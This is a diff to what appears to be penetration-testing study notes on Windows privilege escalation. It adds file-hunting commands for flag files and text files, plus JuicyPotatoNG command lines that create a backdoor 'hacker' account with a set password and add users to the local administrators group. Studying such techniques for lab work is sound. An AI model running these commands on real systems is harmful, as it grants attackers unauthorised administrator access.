@@ -20,6 +20,7 @@ powershell
 Get-LocalUser
 Get-LocalGroup
 Get-LocalGroupMember group
+Get-LocalGroupMember administrators
 
 Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 
@@ -29,6 +30,12 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
 
 Get-Process
 Get-Process | Select ProcessName,Path
+
+Get-ChildItem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
+
+Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
+
+Get-ChildItem -Path C:\ -Include proof.txt, local.txt -File -Recurse -ErrorAction SilentlyContinue
 
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 
@@ -243,6 +250,12 @@ If we have `SeImpersonatePrivilege` we can use also Juicy-Potato to create an a
 - https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1
 
 There is a wide range of this exploits. We can use the whole [Potato Family](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) and perform a Privilege Escalation. A real-life scenario of a Windows privilege escaltion could be exploiting the [`SeBackupPrivilege`](https://juggernaut-sec.com/sebackupprivilege).
+
+```powershell
+.\JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "/c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
+
+.\JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "net localgroup administrators user /add"
+```
 
 ## Extracting a Copy of the SAM and SYSTEM Files Using reg.exe
 ---
